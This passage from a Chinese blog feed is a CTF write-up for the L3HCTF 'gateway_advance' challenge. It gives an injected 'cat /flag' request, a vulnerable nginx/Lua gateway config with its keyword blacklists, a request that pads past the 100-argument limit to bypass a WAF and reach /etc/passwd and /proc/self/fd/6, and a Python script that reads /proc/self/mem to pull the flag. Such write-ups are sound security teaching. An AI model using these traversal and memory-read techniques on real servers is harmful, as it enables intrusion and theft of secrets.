session=.eJwljjEOAjEMBP_imsJO7MS5zyDHsQUS1Z2oEH8nEsU2u7PSfOCeZ1wPONJeV9zg_lxwgDsqE7P5dJlEiJ5O04tkzbYjYtNKtuWqWpBMBorVFsYx2mDBhYu7UlJ4MO3XzBDtuos9CK2hSLP3rIQlzZEEN4EpdTBskfcV59-GEL4_UgMvzQ.aHXh4g.HH_RTaBH9nTKqiAAYooVAu2G1VQConnection: keep-alive5、GET /ip_detail/user14.gif?os=os&amp;a=cat%20/flag HTTP/1.1Host: 127.0.0.1:8081sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126"sec-ch-ua-mobile: ?0sec-ch-ua-platform: "Windows"Accept-Language: zh-CNUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.183 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflate, brCookie: session=.eJwljjEOAjEMBP_imsJO7MS5zyDHsQUS1Z2oEH8nEsU2u7PSfOCeZ1wPONJeV9zg_lxwgDsqE7P5dJlEiJ5O04tkzbYjYtNKtuWqWpBMBorVFsYx2mDBhYu7UlJ4MO3XzBDtuos9CK2hSLP3rIQlzZEEN4EpdTBskfcV59-GEL4_UgMvzQ.aHXh4g.HH_RTaBH9nTKqiAAYooVAu2G1VQConnection: keep-alive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/b286bc508b1223e32722f6541af48c18.png"></p><hr><h3 id="gateway-advance"><a href="#gateway-advance" class="headerlink" title="gateway_advance"></a>gateway_advance</h3><p><a href="https://github.com/p0pr0ck5/lua-resty-waf/issues/280">ngx.req.get_uri_args() can’t get more than 100 request arguments · Issue #280 · p0pr0ck5/lua-resty-waf</a></p><pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">worker_processes</span> <span class="token number">1</span></span><span class="token punctuation">;</span><span class="token directive"><span class="token keyword">events</span></span> <span class="token punctuation">{</span>    <span class="token directive"><span class="token keyword">use</span> epoll</span><span class="token punctuation">;</span>    <span class="token directive"><span class="token keyword">worker_connections</span> <span class="token number">10240</span></span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token directive"><span class="token keyword">http</span></span> <span class="token punctuation">{</span>    <span class="token directive"><span class="token keyword">include</span> mime.types</span><span class="token punctuation">;</span>    <span class="token directive"><span class="token keyword">default_type</span> text/html</span><span class="token punctuation">;</span>    <span class="token directive"><span class="token keyword">access_log</span> <span class="token boolean">off</span></span><span class="token punctuation">;</span>    <span class="token directive"><span class="token keyword">error_log</span> /dev/null</span><span class="token punctuation">;</span>    <span class="token directive"><span class="token keyword">sendfile</span> <span class="token boolean">on</span></span><span class="token punctuation">;</span>    <span class="token directive"><span class="token keyword">init_by_lua_block</span></span> <span class="token punctuation">{</span>        f = io.open("/flag", "r")        f2 = io.open("/password", "r")        flag = f:read("*all")        password = f2:read("*all")        f:close()        password = string.gsub(password, "[\n\r]", "")        os.remove("/flag")        os.remove("/password")    <span class="token punctuation">}</span>    <span class="token directive"><span class="token keyword">server</span></span> <span class="token punctuation">{</span>        <span class="token directive"><span class="token keyword">listen</span> <span class="token number">80</span> default_server</span><span class="token punctuation">;</span>        <span class="token directive"><span class="token keyword">location</span> /</span> <span class="token punctuation">{</span>            <span class="token directive"><span class="token keyword">content_by_lua_block</span></span> <span class="token punctuation">{</span>                ngx.say("hello, <span class="token directive"><span class="token keyword">world!")</span>            }        }        location /static {            alias /www/;            access_by_lua_block {                if ngx.var.remote_addr ~= <span class="token string">"127.0.0.1"</span> then                    ngx.exit(403)                end            }            add_header Accept-Ranges bytes;        }           <span class="token comment">#local blacklist = {"%.", "/", "</span></span><span class="token punctuation">;</span>", "flag", "proc"<span class="token punctuation">}</span><span class="token comment">#定义敏感字符 / 关键词黑名单：</span><span class="token comment">#%.（点号，转义是因为.在 Lua 模式匹配中是通配符）和 /（斜杠）：防止路径遍历攻击（如 ../ 访问上级目录）。</span><span class="token comment">#;（分号）：防止命令注入（如拼接系统命令）。</span><span class="token comment">#flag、proc：CTF 中常见的敏感关键词（flag 是目标文件，proc 对应 Linux /proc 进程目录，可能泄露系统信息）。</span><span class="token comment">#local args = ngx.req.get_uri_args()</span><span class="token comment">#获取 URL 中的查询参数（如 ?filename=test.txt 中的 filename 和 test.txt）。</span><span class="token comment">#for k, v in pairs(args) do</span><span class="token comment">#遍历所有查询参数（k 是参数名，v 是参数值，支持多值参数如 ?a=1&amp;a=2）。</span><span class="token comment">#for _, b in ipairs(blacklist) do</span><span class="token comment">#嵌套遍历黑名单中的每个敏感字符 b。</span><span class="token comment">#if string.find(v, b) then ngx.exit(403)</span><span class="token comment">#检查参数值 v 中是否包含 b，若包含则立即返回 403 禁止访问（拦截恶意请求）。     </span>        <span class="token directive"><span class="token keyword">location</span> /download</span> <span class="token punctuation">{</span>            <span class="token directive"><span class="token keyword">access_by_lua_block</span></span> <span class="token punctuation">{</span>                <span class="token directive"><span class="token keyword">local</span> blacklist =</span> <span class="token punctuation">{</span>"%.", "/", "<span class="token punctuation">;</span>", "flag", "proc"<span class="token punctuation">}</span>                local args = ngx.req.get_uri_args()                for k, v in pairs(args) do                    for _, b in ipairs(blacklist) do                        if string.find(v, b) then                            ngx.exit(403)                        end                    end                end            <span class="token punctuation">}</span>            <span class="token directive"><span class="token keyword">add_header</span> Content-Disposition <span class="token string">"attachment; filename=download.txt"</span></span><span class="token punctuation">;</span>            <span class="token directive"><span class="token keyword">proxy_pass</span> http://127.0.0.1/static<span class="token variable">$arg_filename</span></span><span class="token punctuation">;</span>            <span class="token comment">#将当前 /download 请求转发到本地（127.0.0.1）的 /static 路径，并拼接查询参数 filename 的值。</span><span class="token comment">#例如：若请求为 http://xxx/download?filename=file.txt，则实际转发到 http://127.0.0.1/static/file.txt。</span><span class="token comment">#结合前文配置，/static 路径映射到服务器本地的 /www/ 目录，且仅允许本地 IP 访问，因此该代理实现了 “外部通过 /download 间接访问 /static 资源” 的逻辑。</span>            <span class="token directive"><span class="token keyword">body_filter_by_lua_block</span></span> <span class="token punctuation">{</span>                <span class="token directive"><span class="token keyword">local</span> blacklist =</span> <span class="token punctuation">{</span>"flag", "l3hsec", "l3hctf", "password", "secret", "confidential"<span class="token punctuation">}</span>                for _, b in ipairs(blacklist) do                    if string.find(ngx.arg[1], b) then                    <span class="token comment">#ngx.arg[1] 是响应体的片段（因 Nginx 处理响应是流式的，可能分多次处理）。</span>                        ngx.arg[1] = string.rep("*", string.len(ngx.arg[1]))                    <span class="token comment">#过滤逻辑按数据块处理而非整体处理.当只读取1字节时，不可能包含完整敏感词（如"password"=8字节）单字节响应永远不会触发过滤</span>                    end                end            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token directive"><span class="token keyword">location</span> /read_anywhere</span> <span class="token punctuation">{</span>            <span class="token directive"><span class="token keyword">access_by_lua_block</span></span> <span class="token punctuation">{</span>                if ngx.var.http_x_gateway_password ~= password then                    ngx.say("go find the password first!")                    ngx.exit(403)                end            <span class="token punctuation">}</span>            <span class="token directive"><span class="token keyword">content_by_lua_block</span></span> <span class="token punctuation">{</span>                local f = io.open(ngx.var.http_x_gateway_filename, "r")                if not f then                    ngx.exit(404)                end                local start = tonumber(ngx.var.http_x_gateway_start) or 0                local length = tonumber(ngx.var.http_x_gateway_length) or 1024                if length &gt; 1024 * 1024 then                    length = 1024 * 1024                end                f:seek("set", start)                local content = f:read(length)                f:close()                ngx.say(content)                ngx.header["Content-Type"] = "application/octet-stream"            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">/download?&amp;a0=0&amp;a1=1&amp;a2=2&amp;a3=3&amp;a4=4&amp;a5=5&amp;a6=6&amp;a7=7&amp;a8=8&amp;a9=9&amp;a10=10&amp;a11=11&amp;a12=12&amp;a13=13&amp;a14=14&amp;a15=15&amp;a16=16&amp;a17=17&amp;a18=18&amp;a19=19&amp;a20=20&amp;a21=21&amp;a22=22&amp;a23=23&amp;a24=24&amp;a25=25&amp;a26=26&amp;a27=27&amp;a28=28&amp;a29=29&amp;a30=30&amp;a31=31&amp;a32=32&amp;a33=33&amp;a34=34&amp;a35=35&amp;a36=36&amp;a37=37&amp;a38=38&amp;a39=39&amp;a40=40&amp;a41=41&amp;a42=42&amp;a43=43&amp;a44=44&amp;a45=45&amp;a46=46&amp;a47=47&amp;a48=48&amp;a49=49&amp;a50=50&amp;a51=51&amp;a52=52&amp;a53=53&amp;a54=54&amp;a55=55&amp;a56=56&amp;a57=57&amp;a58=58&amp;a59=59&amp;a60=60&amp;a61=61&amp;a62=62&amp;a63=63&amp;a64=64&amp;a65=65&amp;a66=66&amp;a67=67&amp;a68=68&amp;a69=69&amp;a70=70&amp;a71=71&amp;a72=72&amp;a73=73&amp;a74=74&amp;a75=75&amp;a76=76&amp;a77=77&amp;a78=78&amp;a79=79&amp;a80=80&amp;a81=81&amp;a82=82&amp;a83=83&amp;a84=84&amp;a85=85&amp;a86=86&amp;a87=87&amp;a88=88&amp;a89=89&amp;a90=90&amp;a91=91&amp;a92=92&amp;a93=93&amp;a94=94&amp;a95=95&amp;a96=96&amp;a97=97&amp;a98=98&amp;a=information_schemas&amp;filename=../etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ol><li><p><strong><code>/proc</code> 文件系统</strong><br><code>/proc</code> 是 Linux 系统中的虚拟文件系统，用于提供进程和系统内核的实时信息，并非实际存储在磁盘上。其中每个以数字命名的子目录（如 <code>/proc/1</code>）对应一个进程的 ID（PID），包含该进程的详细信息（如内存、文件描述符、环境变量等）。</p></li><li><p><strong><code>/proc/[PID]/fd</code> 目录</strong><br>每个进程的 <code>/proc/[PID]/fd</code> 目录下，会以数字（0、1、2、3…）命名的符号链接，每个链接对应进程当前打开的一个文件描述符。例如：</p><ul><li><code>0</code>：标准输入（stdin）</li><li><code>1</code>：标准输出（stdout）</li><li><code>2</code>：标准错误（stderr）</li><li>3 及以上：进程打开的其他文件、网络连接、管道等。</li></ul></li><li><p><strong><code>/proc/1/fd/6</code></strong></p><ul><li><code>1</code> 是进程 ID，通常对应系统初始化进程（如 <code>systemd</code>），负责启动和管理系统服务。</li><li><code>6</code> 是该进程打开的第 6 个文件描述符，具体指向什么内容取决于进程的行为（可能是某个配置文件、日志文件、管道或网络套接字等）。</li></ul></li><li><p><strong><code>/proc/self</code> 的含义</strong><br><code>/proc/self</code> 是一个动态符号链接，始终指向当前正在访问该路径的进程自身的 <code>/proc/[PID]</code> 目录（例如，当进程 A 访问 <code>/proc/self</code> 时，它等价于 <code>/proc/[A的PID]</code>）。这使得进程可以无需知道自身 PID 即可访问自己的信息。</p></li><li><p><strong><code>mem</code> 文件的作用</strong><br><code>/proc/self/mem</code> 以二进制形式直接映射当前进程的虚拟内存空间，允许进程通过读写该文件来<strong>直接操作自身的内存数据</strong>（如修改变量值、注入代码等）。</p><ul><li>读操作：可获取内存中指定地址的数据（需知道具体内存地址，且该地址必须是进程可访问的）。</li><li>写操作：可修改内存中指定地址的数据（同样受进程权限和内存保护机制限制，如只读内存页无法写入）。</li></ul></li></ol></blockquote><pre class="line-numbers language-none"><code class="language-none">GET /download?&amp;a0=0&amp;a1=1&amp;a2=2&amp;a3=3&amp;a4=4&amp;a5=5&amp;a6=6&amp;a7=7&amp;a8=8&amp;a9=9&amp;a10=10&amp;a11=11&amp;a12=12&amp;a13=13&amp;a14=14&amp;a15=15&amp;a16=16&amp;a17=17&amp;a18=18&amp;a19=19&amp;a20=20&amp;a21=21&amp;a22=22&amp;a23=23&amp;a24=24&amp;a25=25&amp;a26=26&amp;a27=27&amp;a28=28&amp;a29=29&amp;a30=30&amp;a31=31&amp;a32=32&amp;a33=33&amp;a34=34&amp;a35=35&amp;a36=36&amp;a37=37&amp;a38=38&amp;a39=39&amp;a40=40&amp;a41=41&amp;a42=42&amp;a43=43&amp;a44=44&amp;a45=45&amp;a46=46&amp;a47=47&amp;a48=48&amp;a49=49&amp;a50=50&amp;a51=51&amp;a52=52&amp;a53=53&amp;a54=54&amp;a55=55&amp;a56=56&amp;a57=57&amp;a58=58&amp;a59=59&amp;a60=60&amp;a61=61&amp;a62=62&amp;a63=63&amp;a64=64&amp;a65=65&amp;a66=66&amp;a67=67&amp;a68=68&amp;a69=69&amp;a70=70&amp;a71=71&amp;a72=72&amp;a73=73&amp;a74=74&amp;a75=75&amp;a76=76&amp;a77=77&amp;a78=78&amp;a79=79&amp;a80=80&amp;a81=81&amp;a82=82&amp;a83=83&amp;a84=84&amp;a85=85&amp;a86=86&amp;a87=87&amp;a88=88&amp;a89=89&amp;a90=90&amp;a91=91&amp;a92=92&amp;a93=93&amp;a94=94&amp;a95=95&amp;a96=96&amp;a97=97&amp;a98=98&amp;a=information_schemas&amp;filename=../proc/self/fd/6 HTTP/1.1Host: 1.95.8.146:17794Range: bytes=23-49dsoneverwannagiveyouup依次弄一下，得到passwordismemeispasswordsoneverwannagiveyouup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>在 Linux 系统中，<code>/proc/self/maps</code> 是一个特殊的伪文件，用于<strong>展示当前进程（<code>self</code> 指代访问该文件的进程自身）的内存映射信息</strong>。它记录了进程地址空间中所有的内存区域（如代码段、数据段、堆、栈、共享库、映射文件等）的详细信息，是分析进程内存布局的重要工具。</p><h3 id="文件内容格式"><a href="#文件内容格式" class="headerlink" title="文件内容格式"></a>文件内容格式</h3><p><code>/proc/self/maps</code> 的每一行对应进程中的一个内存区域，格式如下（以典型行为例）：</p><pre class="line-numbers language-none"><code class="language-none">55f8d7a00000-55f8d7a02000 r--p 00000000 08:01 1234567  /usr/bin/ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>各字段含义从左到右依次为：</p><ol><li><strong>内存地址范围</strong>（<code>55f8d7a00000-55f8d7a02000</code>）<br>该内存区域在进程虚拟地址空间中的起始地址和结束地址（十六进制），表示此区域占用的地址范围。</li><li><strong>权限标志</strong>（<code>r--p</code>）<br>4 个字符分别表示：<ul><li>第 1 位：<code>r</code>（可读）、<code>-</code>（不可读）</li><li>第 2 位：<code>w</code>（可写）、<code>-</code>（不可写）</li><li>第 3 位：<code>x</code>（可执行）、<code>-</code>（不可执行）</li><li>第 4 位：<code>p</code>（私有内存，如进程堆、栈）、<code>s</code>（共享内存，如共享库、匿名共享映射）</li></ul></li><li><strong>偏移量</strong>（<code>00000000</code>）<br>该内存区域对应的文件在磁盘上的偏移量（十六进制）。若为匿名映射（如堆、栈），此值通常为 <code>0</code>。</li><li><strong>设备号</strong>（<code>08:01</code>）<br>映射文件所在的设备标识符（主设备号：次设备号），匿名映射（如堆、栈）此处为 <code>00:00</code>。</li><li><strong>inode 号</strong>（<code>1234567</code>）<br>映射文件的 inode 编号，匿名映射此处为 <code>0</code>。</li><li><strong>映射来源</strong>（<code>/usr/bin/ls</code>）<br>内存区域的来源：<ul><li>若为文件映射，显示文件路径（如可执行文件、共享库、普通文件）。</li><li>若为匿名映射，可能显示 <code>[heap]</code>（堆）、<code>[stack]</code>（栈）、<code>[anon]</code>（匿名内存）等。</li></ul></li></ol></blockquote><pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">init_by_lua_block</span></span> <span class="token punctuation">{</span>        <span class="token comment"># 在最后加上一段</span>        print(tostring(flag))        <span class="token comment">#tostring(flag)：将 Lua 变量 flag 转换为字符串（若 flag 本身是字符串则直接返回）。</span><span class="token comment">#print(...)：输出到 Nginx 的错误日志（通常为 /var/log/nginx/error.log，但配置中已定向到 /dev/null）。</span>        local ffi = require("ffi")        local ptr = ffi.cast("const char*", flag)        <span class="token comment">#require("ffi")：加载 LuaJIT 的 FFI 模块，该模块允许 Lua 代码直接调用 C 函数和操作 C 数据类型。</span><span class="token comment">#ffi.cast("const char*", flag)：将 Lua 字符串 flag 转换为 C 风格的只读字符指针（const char*）。</span><span class="token comment">#关键点：LuaJIT 在内存中会将字符串存储为连续的字节数组，通过 FFI 可获取该数组的起始地址。</span>        print("Address: ", tostring(ptr))        <span class="token comment">#tostring(ptr)：将 C 指针转换为 Lua 字符串，格式为 0xXXXXXXXXXXXXXXXX（十六进制内存地址）。</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.xmcve.com/2025/07/15/L3HCTF2025-Writeup/#title-5">L3HCTF Writeup - 星盟安全团队</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> time<span class="token comment"># === 配置项 ===</span>TARGET <span class="token operator">=</span> <span class="token string">"http://43.138.2.216:17794/read_anywhere"</span>PASSWORD <span class="token operator">=</span> <span class="token string">"passwordismemeispasswordsoneverwannagiveyouup"</span>CHUNK_SIZE <span class="token operator">=</span> <span class="token number">4096</span>  <span class="token comment"># 每次读取的字节数</span>FLAG_PREFIX <span class="token operator">=</span> <span class="token string">b"L3HCTF{"</span><span class="token comment"># === 读取 maps ===</span><span class="token keyword">def</span> <span class="token function">get_readable_ranges</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"X-Gateway-Password"</span><span class="token punctuation">:</span> PASSWORD<span class="token punctuation">,</span>        <span class="token string">"X-Gateway-Filename"</span><span class="token punctuation">:</span> <span class="token string">"/proc/self/maps"</span><span class="token punctuation">,</span>        <span class="token string">"X-Gateway-Start"</span><span class="token punctuation">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span>        <span class="token string">"X-Gateway-Length"</span><span class="token punctuation">:</span> <span class="token string">"65536"</span>    <span class="token punctuation">}</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] 请求 /proc/self/maps ..."</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>TARGET<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"无法读取 maps: </span><span class="token interpolation"><span class="token punctuation">{</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    ranges <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        m <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">r'^([0-9a-fA-F]+)-([0-9a-fA-F]+) ([rwxp\-]{4})'</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span>        <span class="token keyword">if</span> m <span class="token keyword">and</span> <span class="token string">'r'</span> <span class="token keyword">in</span> m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>            end <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>            ranges<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 找到 </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>ranges<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string"> 个可读内存段"</span></span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ranges<span class="token comment"># === 搜索内存中包含 flag 的区域 ===</span><span class="token keyword">def</span> <span class="token function">search_flag_in_mem</span><span class="token punctuation">(</span>ranges<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> start<span class="token punctuation">,</span> end <span class="token keyword">in</span> ranges<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] 扫描内存段: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">hex</span><span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string"> - </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">hex</span><span class="token punctuation">(</span>end<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        offset <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">while</span> start <span class="token operator">+</span> offset <span class="token operator">&lt;</span> end<span class="token punctuation">:</span>            size <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>CHUNK_SIZE<span class="token punctuation">,</span> end <span class="token operator">-</span> <span class="token punctuation">(</span>start <span class="token operator">+</span> offset<span class="token punctuation">)</span><span class="token punctuation">)</span>            headers <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token string">"X-Gateway-Password"</span><span class="token punctuation">:</span> PASSWORD<span class="token punctuation">,</span>                <span class="token string">"X-Gateway-Filename"</span><span class="token punctuation">:</span> <span class="token string">"/proc/self/mem"</span><span class="token punctuation">,</span>                <span class="token string">"X-Gateway-Start"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>start <span class="token operator">+</span> offset<span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token string">"X-Gateway-Length"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span>            <span class="token punctuation">}</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>TARGET<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!] 读取失败 status=</span><span class="token interpolation"><span class="token punctuation">{</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">}</span></span><span class="token string"> offset=</span><span class="token interpolation"><span class="token punctuation">{</span>offset<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                    <span class="token keyword">break</span>                data <span class="token operator">=</span> r<span class="token punctuation">.</span>content                <span class="token keyword">if</span> FLAG_PREFIX <span class="token keyword">in</span> data<span class="token punctuation">:</span>                    index <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span>FLAG_PREFIX<span class="token punctuation">)</span>                    <span class="token comment"># 简单截断 flag（直到遇到右大括号或 50 字节以内）</span>                    tail <span class="token operator">=</span> data<span class="token punctuation">[</span>index<span class="token punctuation">:</span>index <span class="token operator">+</span> <span class="token number">50</span><span class="token punctuation">]</span>                    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">rb'L3HCTF\{[^\}]{1,48}\}'</span><span class="token punctuation">,</span> tail<span class="token punctuation">)</span>                    <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n🎉 找到 flag: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                        <span class="token keyword">return</span> <span class="token boolean">True</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[?] 找到前缀但无法确定完整 flag: </span><span class="token interpolation"><span class="token punctuation">{</span>tail<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                        <span class="token keyword">return</span> <span class="token boolean">True</span>                offset <span class="token operator">+=</span> size            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!] 请求异常: </span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] 未找到 flag"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    ranges <span class="token operator">=</span> get_readable_ranges<span class="token punctuation">(</span><span class="token punctuation">)</span>    found <span class="token operator">=</span> search_flag_in_mem<span class="token punctuation">(</span>ranges<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> found<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] flag 未找到"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>r3tf</title>
      <link href="/2025/07/20/2025/"/>
      <url>/2025/07/20/2025/</url>
      
